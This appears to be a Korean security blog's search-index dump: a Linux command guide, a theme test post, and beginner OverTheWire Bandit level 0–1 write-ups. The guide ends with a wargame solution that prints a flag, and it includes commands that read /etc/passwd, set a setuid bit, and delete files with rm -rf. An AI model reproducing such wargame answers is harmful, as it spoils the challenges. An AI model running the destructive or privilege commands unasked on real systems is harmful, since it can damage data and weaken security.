파일명/명령어 자동완성\rTab Tab # 가능한 모든 옵션 표시 별칭(Alias) 설정 자주 사용하는 명령어를 짧게 만들 수 있습니다.\n1 2 3 4 5 6 7 8 9 # 임시 별칭 (현재 세션만) alias ll=\u0026#39;ls -alh\u0026#39; alias ..=\u0026#39;cd ..\u0026#39; alias ...=\u0026#39;cd ../..\u0026#39; alias grep=\u0026#39;grep --color=auto\u0026#39; # 영구 별칭 (~/.bashrc 또는 ~/.zshrc에 추가) echo \u0026#34;alias ll=\u0026#39;ls -alh\u0026#39;\u0026#34; \u0026gt;\u0026gt; ~/.bashrc source ~/.bashrc 환경 변수 1 2 3 4 5 6 7 8 9 10 11 echo $PATH # PATH 환경 변수 확인 echo $HOME # 홈 디렉토리 echo $USER # 현재 사용자 echo $SHELL # 현재 셸 # 환경 변수 설정 export MY_VAR=\u0026#34;value\u0026#34; echo $MY_VAR # 영구 설정 (~/.bashrc에 추가) echo \u0026#39;export PATH=$PATH:/my/custom/path\u0026#39; \u0026gt;\u0026gt; ~/.bashrc 작업 관리 1 2 3 4 5 command \u0026amp; # 백그라운드에서 실행 jobs # 백그라운드 작업 목록 fg %1 # 1번 작업을 포그라운드로 bg %1 # 1번 작업을 백그라운드로 nohup command \u0026amp; # 로그아웃 후에도 계속 실행 파일 찾기 고급 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 최근 수정된 파일 찾기 find . -mtime -7 # 7일 이내 find . -mmin -60 # 60분 이내 # 파일 크기로 찾기 find . -size +100M # 100MB 이상 find . -size -1k # 1KB 이하 # 찾은 파일에 명령 실행 find . -name \u0026#34;*.log\u0026#34; -exec rm {} \\; find . -type f -name \u0026#34;*.txt\u0026#34; -exec grep \u0026#34;error\u0026#34; {} + # 여러 조건 조합 find . -type f -name \u0026#34;*.py\u0026#34; -size +1M -mtime -30 텍스트 처리 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # 줄 번호 표시 cat -n file.txt nl file.txt # 중복 제거 sort file.txt | uniq sort -u file.txt # 컬럼 추출 awk \u0026#39;{print $1}\u0026#39; file.txt # 첫 번째 컬럼 cut -d\u0026#39;:\u0026#39; -f1 /etc/passwd # : 구분자로 첫 번째 필드 # 문자열 치환 sed \u0026#39;s/old/new/\u0026#39; file.txt # 첫 번째 매치만 sed \u0026#39;s/old/new/g\u0026#39; file.txt # 모든 매치 sed -i \u0026#39;s/old/new/g\u0026#39; file.txt # 파일 직접 수정 시스템 모니터링 1 2 3 4 5 6 7 8 9 10 11 12 # 디스크 I/O iostat iotop # 실시간 I/O 모니터링 # 네트워크 netstat -tuln # 리스닝 포트 ss -tuln # 현대적인 대체 lsof -i :80 # 특정 포트 사용 프로세스 # 메모리 free -h # 메모리 사용량 vmstat # 가상 메모리 통계 실전 시나리오 시나리오 1: 디스크 공간 확보 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 1. 디스크 사용량 확인 df -h # 2. 큰 파일/디렉토리 찾기 du -sh /* | sort -h # 3. 특정 디렉토리 상세 분석 du -h --max-depth=1 /home | sort -h # 4. 100MB 이상 파일 찾기 find / -type f -size +100M 2\u0026gt;/dev/null # 5. 오래된 로그 파일 정리 find /var/log -name \u0026#34;*.log\u0026#34; -mtime +30 -delete # 6. 임시 파일 정리 sudo apt clean # 패키지 캐시 rm -rf ~/.cache/* # 사용자 캐시 시나리오 2: 시스템 느림 진단 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 1. CPU 사용률 확인 top # 2. CPU 사용 상위 프로세스 ps aux --sort=-%cpu | head # 3. 메모리 사용 상위 프로세스 ps aux --sort=-%mem | head # 4. 디스크 I/O 확인 iostat -x 1 # 5. 특정 프로세스 종료 kill -9 [PID] 시나리오 3: 로그 분석 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 1. 최근 에러 확인 tail -f /var/log/nginx/error.log # 2. 특정 시간대 로그 grep \u0026#34;2026-01-12 14:\u0026#34; /var/log/nginx/access.log # 3. 404 에러 개수 grep \u0026#34;404\u0026#34; /var/log/nginx/access.log | wc -l # 4. IP별 요청 횟수 awk \u0026#39;{print $1}\u0026#39; /var/log/nginx/access.log | sort | uniq -c | sort -rn # 5. 가장 많이 요청된 URL awk \u0026#39;{print $7}\u0026#39; /var/log/nginx/access.log | sort | uniq -c | sort -rn | head # 6. 에러 로그를 파일로 저장 grep \u0026#34;error\u0026#34; /var/log/nginx/error.log \u0026gt; errors_$(date +%Y%m%d).log 시나리오 4: 백업 및 복원 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 1. 압축 백업 생성 tar -czf backup_$(date +%Y%m%d_%H%M%S).tar.gz /path/to/project # 2. 원격 서버로 전송 scp backup_*.tar.gz user@remote:/backup/ # 3. 백업에서 복원 tar -xzf backup_20260112_143000.tar.gz # 4. 특정 파일만 추출 tar -xzf backup.tar.gz path/to/specific/file # 5. 증분 백업 (rsync 사용) rsync -avz --delete /source/ /backup/ # 6. 원격 동기화 rsync -avz -e ssh /local/path/ user@remote:/remote/path/ 시나리오 5: 권한 문제 해결 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 1. 파일 권한 확인 ls -l /var/www/html/ # 2. 소유자 확인 stat /var/www/html/index.html # 3. 웹 서버 사용자 확인 (nginx 예시) ps aux | grep nginx # 4. 소유자 변경 sudo chown -R www-data:www-data /var/www/html/ # 5. 권한 설정 sudo find /var/www/html -type d -exec chmod 755 {} \\; sudo find /var/www/html -type f -exec chmod 644 {} \\; # 6. 특수 권한이 필요한 경우 sudo chmod u+s /usr/bin/special_program 실전 문제 풀이 1 2 3 4 5 ls # 현재 디렉토리 파일 확인 cat hint.txt # 힌트 파일 읽기 cat /dream/hack/hello/flag.txt # 힌트에 나온 경로의 플래그 읽기 cat app.py # 추가 파일 확인 cat ./dream/hack/hello/f*ag.txt # 와일드카드로 플래그 파일 읽기 Details DH{671ce26c70829e716fae26c7c71a33823feb479f2562891f64605bf68f60ae54}\n","permalink":"https://alwayshyeon.github.io/posts/linux_guide/","summary":"리눅스 셸 기본부터 고급 명령어까지","title":"리눅스 필수 명령어 가이드"},{"content":"1. 개요 (Intro) 안녕하세요, AlwaysHyeon의 보안 블로그입니다. 이 글은 GitHub Pages와 Hugo PaperMod 테마가 정상적으로 연동되었는지 확인하기 위한 테스트 포스트입니다.\n테스트 환경 Generator: Hugo Theme: PaperMod Hosting: GitHub Pages 2. 기능 테스트 (Feature Test) 2.1. 코드 하이라이팅 (Code Block) Python 코드가 예쁘게 나오는지 확인합니다.\n1 2 3 4 5 6 7 8 import os def check_security(): print(\u0026#34;System Secure... maybe?\u0026#34;) return True if __name__ == \u0026#34;__main__\u0026#34;: check_security() ","permalink":"https://alwayshyeon.github.io/posts/test-post/","summary":"Hugo PaperMod 테마 적용 테스트 글입니다. 마크다운 문법과 코드 하이라이팅이 잘 적용되는지 확인합니다.","title":"블로그 테스트 및 첫 번째 글 (Hello World)"},{"content":"Bandit 시작 1 2 3 4 ssh -p 2220 bandit[level]@bandit.labs.overthewire.org # ssh: 원격 호스트에 접속하기 위한 프로토콜 # -p 2220: SSH의 기본 포트는 22번이지만, Bandit 연구소는 2220번 포트를 사용하므로 -p 옵션으로 포트를 지정해야 합니다. 로 시작할 수 있습니다.\nTroubleshooting 실습 도중 아래와 같은 DNS 에러가 발생하여 접속이 불가능했습니다.\n1 ssh: Could not resolve hostname bandit.labs.overthewire.org: Temporary failure in name resolution 가상머신(Kali Linux)의 네트워크 설정 문제였습니다. /etc/resolv.conf에 구글 DNS(8.8.8.8)를 추가하여 해결했습니다. 주소를 입력했을 때\n문제 readme 파일에서 비밀번호 찾기 1 2 3 4 5 6 7 8 9 10 bandit0@bandit:~$ ls # ls (List): 현재 디렉토리의 파일과 폴더 목록을 보여줍니다. readme bandit0@bandit:~$ cat readme # cat (Concatenate): 파일의 내용을 터미널에 출력합니다. Congratulations on your first steps into the bandit game!! Please make sure you have read the rules at https://overthewire.org/rules/ If you are following a course, workshop, walkthrough or other educational activity, please inform the instructor about the rules as well and encourage them to contribute to the OverTheWire community so we can keep these games free! The password you are looking for is: PASSWORD 1 exit ","permalink":"https://alwayshyeon.github.io/posts/bandit/bandit0/","summary":"OverTheWire Bandit Level 0 풀이 및 SSH 접속 에러 해결","title":"[Wargame] Bandit Level 0 -\u003e Level 1"},{"content":"문제 -가 파일인 곳에 비밀번호가 있습니다. 풀이 1 2 bandit1@bandit:~$ ls - 1 2 3 4 bandit1@bandit:~$ cat - ^C bandit1@bandit:~$ cd - -bash: cd: OLDPWD not set 평소와 같이 하려고 했지만 되지 않았습니다. 보통 dash(-)는 명령어의 옵션과 arguments로 사용되기 때문에 \u0026ldquo;-\u0026rdquo; 파일을 열기위해서는 더 많은 주의가 필요합니다. Create 파일을 생성하기 위해서는 특별한 argument로 \u0026ndash; 를 앞에 붙여줘야 한다. 1 touch -- -filename Read \u0026amp; Copy 1 touch -- -filename filename 안에 내용넣기 1 echo \u0026#34;Hello bandit!\u0026#34; \u0026gt; -filename 파일 내용 읽기 1 cat \u0026lt; -filename 파일 내용 복사하기 1 cp -- -filename /opt List 파일 찾기 1 ls -l -- -filename Remove 1 rm -rf -- -filename 1 2 bandit1@bandit:~$ cat \u0026lt; - PASSWORD 1 exit ","permalink":"https://alwayshyeon.github.io/posts/bandit/bandit1/","summary":"OverTheWire Bandit Level 1 풀이","title":"[Wargame] Bandit Level 1 -\u003e Level 2"}]